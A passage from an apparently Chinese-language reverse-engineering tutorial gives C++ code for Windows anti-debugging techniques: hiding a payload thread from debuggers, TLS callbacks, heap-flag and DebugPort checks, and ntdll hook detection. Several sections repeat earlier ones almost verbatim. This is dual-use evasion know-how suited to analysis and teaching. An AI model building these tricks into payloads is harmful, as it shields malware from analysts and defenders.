<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">HidePayloadThread</span><span class="hljs-params">()</span> </span>&#123;<br>    HANDLE hThread = <span class="hljs-built_in">CreateThread</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)Payload, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(WINAPI* pNtSetInformationThread)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        HANDLE, THREADINFOCLASS, PVOID, ULONG)</span></span>;<br>    <span class="hljs-keyword">auto</span> NtSetInformationThread = (pNtSetInformationThread)<br>        <span class="hljs-built_in">GetProcAddress</span>(<span class="hljs-built_in">GetModuleHandleA</span>(<span class="hljs-string">&quot;ntdll.dll&quot;</span>), <span class="hljs-string">&quot;NtSetInformationThread&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (NtSetInformationThread) &#123;<br>        <span class="hljs-built_in">NtSetInformationThread</span>(hThread, (THREADINFOCLASS)<span class="hljs-number">0x11</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="10-TLS回调：在入口点之前执行"><a href="#10-TLS回调：在入口点之前执行" class="headerlink" title="10. TLS回调：在入口点之前执行"></a><strong>10. TLS回调：在入口点之前执行</strong></h3><p>TLS（线程局部存储）回调会在<code>main()</code>或<code>WinMain()</code>之前执行，甚至在DLL中的<code>DllMain()</code>之前。大多数调试器如果断点设置得太晚，会错过此回调。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// 声明TLS回调</span><br><span class="hljs-function"><span class="hljs-type">void</span> NTAPI <span class="hljs-title">TLSCallback</span><span class="hljs-params">(PVOID, DWORD dwReason, PVOID)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (dwReason == DLL_PROCESS_ATTACH) &#123;<br>        <span class="hljs-built_in">MessageBoxA</span>(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;TLS Executed&quot;</span>, <span class="hljs-string">&quot;Anti-Debug&quot;</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/INCLUDE:_tls_used&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/INCLUDE:__tls_callback&quot;</span>)</span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123;<br>    PIMAGE_TLS_CALLBACK __tls_callback = TLSCallback;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="11-堆标志篡改检测"><a href="#11-堆标志篡改检测" class="headerlink" title="11. 堆标志篡改检测"></a><strong>11. 堆标志篡改检测</strong></h3><p>调试器启用堆调试标志。我们可以通过以下方式检测它们：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">HeapFlagsCheck</span><span class="hljs-params">()</span> </span>&#123;<br>    HANDLE heap = <span class="hljs-built_in">GetProcessHeap</span>();<br>    ULONG flags = *(PULONG)((PUCHAR)heap + <span class="hljs-number">0x0C</span>); <span class="hljs-comment">// Windows堆标志的偏移</span><br>    ULONG forceFlags = *(PULONG)((PUCHAR)heap + <span class="hljs-number">0x10</span>);<br><br>    <span class="hljs-keyword">return</span> (flags &amp; HEAP_TAIL_CHECKING_ENABLED) || <br>           (forceFlags != <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="12-NtQueryInformationProcess：DebugPort-DebugObject"><a href="#12-NtQueryInformationProcess：DebugPort-DebugObject" class="headerlink" title="12. NtQueryInformationProcess：DebugPort &#x2F; DebugObject"></a><strong>12. NtQueryInformationProcess：DebugPort &#x2F; DebugObject</strong></h3><p>这些本地API调用在内核级别检测调试器的存在。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">NtDebugPortCheck</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span> <span class="hljs-params">(WINAPI *pNtQueryInformationProcess)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG)</span></span>;<br>    <br>    DWORD debugPort = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">auto</span> NtQueryInformationProcess = (pNtQueryInformationProcess)<br>        <span class="hljs-built_in">GetProcAddress</span>(<span class="hljs-built_in">GetModuleHandleA</span>(<span class="hljs-string">&quot;ntdll.dll&quot;</span>), <span class="hljs-string">&quot;NtQueryInformationProcess&quot;</span>);<br><br>    NTSTATUS status = <span class="hljs-built_in">NtQueryInformationProcess</span>(<span class="hljs-built_in">GetCurrentProcess</span>(),<br>        (PROCESSINFOCLASS)<span class="hljs-number">7</span>, &amp;debugPort, <span class="hljs-built_in">sizeof</span>(debugPort), <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">return</span> (status == <span class="hljs-number">0</span> &amp;&amp; debugPort != <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="13-OutputDebugString行为（SEH反调试技巧）"><a href="#13-OutputDebugString行为（SEH反调试技巧）" class="headerlink" title="13. OutputDebugString行为（SEH反调试技巧）"></a><strong>13. OutputDebugString行为（SEH反调试技巧）</strong></h3><p>该技巧依赖于<code>OutputDebugStringA</code>在调试器存在时的不同表现。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">OutputDebugCheck</span><span class="hljs-params">()</span> </span>&#123;<br>    __try &#123;<br>        <span class="hljs-built_in">SetLastError</span>(<span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">OutputDebugStringA</span>(<span class="hljs-string">&quot;Debugger?&quot;</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">GetLastError</span>() != <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// 异常被抛出或以不同的方式处理</span><br>    &#125; __except (EXCEPTION_EXECUTE_HANDLER) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="14-VEH钩子检测通过内存扫描"><a href="#14-VEH钩子检测通过内存扫描" class="headerlink" title="14. VEH钩子检测通过内存扫描"></a><strong>14. VEH钩子检测通过内存扫描</strong></h3><p>虚拟异常处理程序（VEH）有时会被调试器钩住。您可以遍历VEH列表或扫描<code>ntdll.dll</code>中的内联钩子。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">NtdllInlineHookCheck</span><span class="hljs-params">()</span> </span>&#123;<br>    HMODULE hNtdll = <span class="hljs-built_in">GetModuleHandleA</span>(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br>    FARPROC func = <span class="hljs-built_in">GetProcAddress</span>(hNtdll, <span class="hljs-string">&quot;NtClose&quot;</span>);<br><br>    <span class="hljs-comment">// 检查是否有意外跳转（例如，JMP，CALL，INT 3）</span><br>    BYTE* b = (BYTE*)func;<br>    <span class="hljs-keyword">return</span> (b[<span class="hljs-number">0</span>] == <span class="hljs-number">0xCC</span> || b[<span class="hljs-number">0</span>] == <span class="hljs-number">0xE9</span> || b[<span class="hljs-number">0</span>] == <span class="hljs-number">0xE8</span> || b[<span class="hljs-number">0</span>] == <span class="hljs-number">0xEB</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="15-检查ScyllaHide、TitanHide或已知钩子"><a href="#15-检查ScyllaHide、TitanHide或已知钩子" class="headerlink" title="15. 检查ScyllaHide、TitanHide或已知钩子"></a><strong>15. 检查ScyllaHide、TitanHide或已知钩子</strong></h3><p>一些高级工具会修补<code>ntdll</code>、<code>kernel32</code>、<code>kernelbase</code>。您可以扫描内存中的版本并与磁盘上的版本进行比较。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">CompareNtdllMemoryWithDisk</span><span class="hljs-params">()</span> </span>&#123;<br>    HMODULE hMem = <span class="hljs-built_in">GetModuleHandleA</span>(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br><br>    TCHAR path[MAX_PATH];<br>    <span class="hljs-built_in">GetModuleFileNameA</span>(hMem, path, MAX_PATH);<br><br>    HANDLE hFile = <span class="hljs-built_in">CreateFileA</span>(path, GENERIC_READ, FILE_SHARE_READ, <span class="hljs-number">0</span>, OPEN_EXISTING, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (hFile == INVALID_HANDLE_VALUE) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>    HANDLE hMap = <span class="hljs-built_in">CreateFileMappingA</span>(hFile, <span class="hljs-number">0</span>, PAGE_READONLY, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    BYTE* diskData = (BYTE*)<span class="hljs-built_in">MapViewOfFile</span>(hMap, FILE_MAP_READ, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>    BYTE* memData = (BYTE*)hMem;<br>    <span class="hljs-type">bool</span> hooked = <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1024</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> (memData[i] != diskData[i]) &#123;<br>            hooked = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">UnmapViewOfFile</span>(diskData);<br>    <span class="hljs-built_in">CloseHandle</span>(hMap);<br>    <span class="hljs-built_in">CloseHandle</span>(hFile);<br><br>    <span class="hljs-keyword">return</span> hooked;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="16-自我调试技术-DebugObject检查"><a href="#16-自我调试技术-DebugObject检查" class="headerlink" title="16. 自我调试技术 (DebugObject检查)"></a><strong>16. 自我调试技术 (DebugObject检查)</strong></h3><p>一个进程不能被两个调试器调试。你可以调用 <code>DebugActiveProcess(GetCurrentProcessId())</code> 来进行自我调试。如果失败，说明已经有另一个调试器连接。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">SelfDebugCheck</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">DebugActiveProcess</span>(<span class="hljs-built_in">GetCurrentProcessId</span>())) &#123;<br>        <span class="hljs-built_in">DebugActiveProcessStop</span>(<span class="hljs-built_in">GetCurrentProcessId</span>());<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">// 没有其他调试器</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// 另一个调试器已阻止该调用</span><br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="17-使用-NtSetInformationThread-隐藏线程"><a href="#17-使用-NtSetInformationThread-隐藏线程" class="headerlink" title="17. 使用 NtSetInformationThread 隐藏线程"></a><strong>17. 使用 NtSetInformationThread 隐藏线程</strong></h3><p>我们之前用它来从调试器中隐藏线程。下面是一个更隐蔽的方法来执行不会被断点打中的payload。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">HidePayloadThread</span><span class="hljs-params">()</span> </span>&#123;<br>    HANDLE hThread = <span class="hljs-built_in">CreateThread</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)Payload, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(WINAPI* pNtSetInformationThread)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        HANDLE, THREADINFOCLASS, PVOID, ULONG)</span></span>;<br>    <span class="hljs-keyword">auto</span> NtSetInformationThread = (pNtSetInformationThread)<br>        <span class="hljs-built_in">GetProcAddress</span>(<span class="hljs-built_in">GetModuleHandleA</span>(<span class="hljs-string">&quot;ntdll.dll&quot;</span>), <span class="hljs-string">&quot;NtSetInformationThread&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (NtSetInformationThread) &#123;<br>        <span class="hljs-built_in">NtSetInformationThread</span>(hThread, (THREADINFOCLASS)<span class="hljs-number">0x11</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="18-TLS回调：在入口点之前执行"><a href="#18-TLS回调：在入口点之前执行" class="headerlink" title="18. TLS回调：在入口点之前执行"></a><strong>18. TLS回调：在入口点之前执行</strong></h3><p>TLS（线程局部存储）回调会在 <code>main()</code> 或 <code>WinMain()</code> 之前执行，甚至在DLL中的 <code>DllMain()</code> 之前。大多数调试器错过此回调（尤其在断点设置得太晚的情况下）。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// 声明TLS回调</span><br><span class="hljs-function"><span class="hljs-type">void</span> NTAPI <span class="hljs-title">TLSCallback</span><span class="hljs-params">(PVOID, DWORD dwReason, PVOID)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (dwReason == DLL_PROCESS_ATTACH) &#123;<br>        <span class="hljs-built_in">MessageBoxA</span>(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;TLS Executed&quot;</span>, <span class="hljs-string">&quot;Anti-Debug&quot;</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/INCLUDE:_tls_used&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/INCLUDE:__tls_callback&quot;</span>)</span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123;<br>    PIMAGE_TLS_CALLBACK __tls_callback = TLSCallback;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="19-堆标志篡改检测"><a href="#19-堆标志篡改检测" class="headerlink" title="19. 堆标志篡改检测"></a><strong>19. 堆标志篡改检测</strong></h3><p>调试器会启用堆调试标志。我们可以通过以下方式检测它们：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">HeapFlagsCheck</span><span class="hljs-params">()</span> </span>&#123;<br>    HANDLE heap = <span class="hljs-built_in">GetProcessHeap</span>();<br>    ULONG flags = *(PULONG)((PUCHAR)heap + <span class="hljs-number">0x0C</span>); <span class="hljs-comment">// Windows堆标志的偏移</span><br>    ULONG forceFlags = *(PULONG)((PUCHAR)heap + <span class="hljs-number">0x10</span>);<br><br>    <span class="hljs-keyword">return</span> (flags &amp; HEAP_TAIL_CHECKING_ENABLED) || <br>           (forceFlags != <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="20-NtQueryInformationProcess-DebugPort-DebugObject"><a href="#20-NtQueryInformationProcess-DebugPort-DebugObject" class="headerlink" title="20. NtQueryInformationProcess: DebugPort &#x2F; DebugObject"></a><strong>20. NtQueryInformationProcess: DebugPort &#x2F; DebugObject</strong></h3><p>这些本地API调用在内核级别检测调试器的存在。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">NtDebugPortCheck</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span> <span class="hljs-params">(WINAPI *pNtQueryInformationProcess)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG)</span></span>;<br>    <br>    DWORD debugPort = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">auto</span> NtQueryInformationProcess = (pNtQueryInformationProcess)<br>        <span class="hljs-built_in">GetProcAddress</span>(<span class="hljs-built_in">GetModuleHandleA</span>(<span class="hljs-string">&quot;ntdll.dll&quot;</span>), <span class="hljs-string">&quot;NtQueryInformationProcess&quot;</span>);<br><br>    NTSTATUS status = <span class="hljs-built_in">NtQueryInformationProcess</span>(<span class="hljs-built_in">GetCurrentProcess</span>(),<br>        (PROCESSINFOCLASS)<span class="hljs-number">7</span>, &amp;debugPort, <span class="hljs-built_in">sizeof</span>(debugPort), <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">return</span> (status == <span class="hljs-number">0</span> &amp;&amp; debugPort != <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="21-OutputDebugString行为-SEH反调试技巧"><a href="#21-OutputDebugString行为-SEH反调试技巧" class="headerlink" title="21. OutputDebugString行为 (SEH反调试技巧)"></a><strong>21. OutputDebugString行为 (SEH反调试技巧)</strong></h3><p>此技巧依赖于 <code>OutputDebugStringA</code> 在调试器存在时的不同表现。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">OutputDebugCheck</span><span class="hljs-params">()</span> </span>&#123;<br>    __try &#123;<br>        <span class="hljs-built_in">SetLastError</span>(<span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">OutputDebugStringA</span>(<span class="hljs-string">&quot;Debugger?&quot;</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">GetLastError</span>() != <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// 异常被抛出或被不同方式处理</span><br>    &#125; __except (EXCEPTION_EXECUTE_HANDLER) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="22-VEH钩子检测（通过内存扫描）"><a href="#22-VEH钩子检测（通过内存扫描）" class="headerlink" title="22. VEH钩子检测（通过内存扫描）"></a><strong>22. VEH钩子检测（通过内存扫描）</strong></h3><p>虚拟异常处理程序（VEH）有时会被调试器钩住。你可以遍历VEH列表或扫描 <code>ntdll.dll</code> 中的内联钩子。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">NtdllInlineHookCheck</span><span class="hljs-params">()</span> </span>&#123;<br>    HMODULE hNtdll = <span class="hljs-built_in">GetModuleHandleA</span>(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br>    FARPROC func = <span class="hljs-built_in">GetProcAddress</span>(hNtdll, <span class="hljs-string">&quot;NtClose&quot;</span>);<br><br>    <span class="hljs-comment">// 检查是否有意外跳转（例如，JMP，CALL，INT 3）</span><br>    BYTE* b = (BYTE*)func;<br>    <span class="hljs-keyword">return</span> (b[<span class="hljs-number">0</span>] == <span class="hljs-number">0xCC</span> || b[<span class="hljs-number">0</span>] == <span class="hljs-number">0xE9</span> || b[<span class="hljs-number">0</span>] == <span class="hljs-number">0xE8</span> || b[<span class="hljs-number">0</span>] == <span class="hljs-number">0xEB</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="23-检查-ScyllaHide、TitanHide-或已知钩子"><a href="#23-检查-ScyllaHide、TitanHide-或已知钩子" class="headerlink" title="23. 检查 ScyllaHide、TitanHide 或已知钩子"></a><strong>23. 检查 ScyllaHide、TitanHide 或已知钩子</strong></h3><p>一些高级工具会修补 <code>ntdll</code>、<code>kernel32</code>、<code>kernelbase</code>。你可以扫描内存中的版本并与磁盘上的版本进行比较。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">CompareNtdllMemoryWithDisk</span><span class="hljs-params">()</span> </span>&#123;<br>    HMODULE hMem = <span class="hljs-built_in">GetModuleHandleA</span>(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br><br>    TCHAR path[MAX_PATH];<br>    <span class="hljs-built_in">GetModuleFileNameA</span>(hMem, path, MAX_PATH);<br><br>    HANDLE hFile = <span class="hljs-built_in">CreateFileA</span>(path, GENERIC_READ, FILE_SHARE_READ, <span class="hljs-number">0</span>, OPEN_EXISTING, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (hFile == INVALID_HANDLE_VALUE) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>    HANDLE hMap = <span class="hljs-built_in">CreateFileMappingA</span>(hFile, <span class="hljs-number">0</span>, PAGE_READONLY, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    BYTE* diskData = (BYTE*)<span class="hljs-built_in">MapViewOfFile</span>(hMap, FILE_MAP_READ, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>    BYTE* memData = (BYTE*)hMem;<br>    <span class="hljs-type">bool</span> hooked = <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1024</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> (memData[i] != diskData[i]) &#123;<br>            hooked = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">UnmapViewOfFile</span>(diskData);<br>    <span class="hljs-built_in">CloseHandle</span>(hMap);<br>    <span class="hljs-built_in">CloseHandle</span>(hFile);<br><br>    <span class="hljs-keyword">return</span> hooked;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="附加学习资源"><a href="#附加学习资源" class="headerlink" title="附加学习资源"></a><strong>附加学习资源</strong></h3><p>您提供的链接是对每个类别的深入剖析：</p>
<ul>
<li><p><strong><a target="_blank" rel="noopener" href="https://malgamy.github.io/revese%20enginnering/Anti-debugging-and-anti-tracing-techniques/">第一部分 – 概述与基础技巧</a></strong></p>
</li>
<li><p><strong><a target="_blank" rel="noopener" href="https://malgamy.github.io/revese%20enginnering/Anti-debugging-and-anti-tracing-techniques-part%5F2/">第二部分 – Nt API &amp; 结构化异常处理</a></strong></p>
</li>
<li><p><strong><a target="_blank" rel="noopener" href="https://malgamy.github.io/revese%20enginnering/Anti-debugging-and-anti-tracing-techniques-part3/">第三部分 – EFLAGS, DrX 和高级CPU技巧</a></strong></p>
</li>
<li><p><strong><a target="_blank" rel="noopener" href="https://malgamy.github.io/revese%20enginnering/Anti-debugging-and-anti-tracing-techniques-part4/">第四部分 – VEH, 堆标志, ICEBP, PEB</a></strong></p>
</li>
<li><p><strong><a target="_blank" rel="noopener" href="https://malgamy.github.io/revese%20enginnering/Anti-debugging-and-anti-tracing-techniques5/">第五部分 – 自我调试, NtSystemDebugControl</a></strong></p>
</li>
</ul>
<hr>
<h3 id="实际案例：Al-Khaser"><a href="#实际案例：Al-Khaser" class="headerlink" title="实际案例：Al-Khaser"></a>实际案例：Al-Khaser</h3><p>开源的**<a target="_blank" rel="noopener" href="https://github.com/ayoubfaouzi/al-khaser">Al-Khaser项目</a>**包含数百种反调试、反虚拟机和规避技术。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/LordNoteworthy/al-khaser<br></code></pre></td></tr></table></figure>

<p>您可以从以下目录提取它们的反调试测试：</p>
